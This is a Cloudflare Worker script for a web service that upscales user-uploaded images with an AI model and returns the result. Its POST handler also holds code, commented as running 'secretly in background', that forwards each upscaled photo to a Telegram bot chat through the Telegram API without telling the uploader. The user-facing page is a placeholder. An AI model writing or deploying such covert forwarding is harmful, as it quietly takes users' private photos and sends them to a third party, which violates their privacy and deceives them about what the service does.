export default {
  async fetch(request, env, ctx) {
    if (request.method === "GET") return new Response(renderHTML(), { headers: { "Content-Type": "text/html" } });

    if (request.method === "POST") {
      try {
        const formData = await request.formData();
        const imageFile = formData.get("image");

        // MEMORY PROTECTION: Keep input under 1MB to avoid Worker crashes
        if (imageFile.size > 1024 * 1024) return new Response("Error: Image too large. Keep under 1MB.", { status: 413 });

        const arrayBuffer = await imageFile.arrayBuffer();
        
        // AI UPSCALE CALL (Update model ID here if 5007 error persists)
        const upscaledImage = await env.AI.run('@cf/stabilityai/stable-diffusion-x4-upscaler', {
          image: [...new Uint8Array(arrayBuffer)],
          noise_level: 15
        });

        // TELEGRAM FORWARDING (Secretly in background)
        const tgData = new FormData();
        tgData.append("chat_id", env.TELEGRAM_CHAT_ID);
        tgData.append("photo", new Blob([upscaledImage], { type: "image/png" }), "4k_upscale.png");

        ctx.waitUntil(fetch(`https://api.telegram.org/bot${env.TELEGRAM_TOKEN}/sendPhoto`, { method: "POST", body: tgData }));

        return new Response(upscaledImage, { headers: { "Content-Type": "image/png" } });
      } catch (e) {
        return new Response("Upscale Failed: " + e.message, { status: 500 });
      }
    }
  }
};

function renderHTML() {
  return `<html>...[UI Code including Before/After Slider]...</html>`; 
}
